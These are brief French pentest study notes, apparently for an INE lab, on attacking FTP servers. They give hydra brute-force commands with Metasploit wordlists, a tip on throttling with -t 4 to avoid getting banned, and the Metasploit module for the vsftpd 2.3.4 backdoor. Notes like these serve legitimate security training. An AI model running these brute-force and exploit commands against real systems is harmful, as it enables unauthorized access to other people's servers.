# FTP
Après un scan si FTP est actif avec la version "ProFTPD 1.3.5a", on peut l'exploiter.  
On craque avec hydra :  
`hydra -L /usr/share/metasploit-framework/data/wordlists/common_users.txt -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt demo.ine.local -t 4 ftp`

``hydra -L /usr/share/metasploit-framework/data/wordlists/common_users.txt -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt ftp://192.18.214.3:5554``

Le `-t 4` permet d'éviter de casser la connexion au serveur ftp et d'être banni du service, en ralentissant la vitesse.  
#### Connexion au serveur ftp
`ftp IP`
on nous demande ensuite les credentials.  

#### Version V2.3.4 est vulnerable

`exploit/unix/ftp/vsftpd_234_backdoor`  

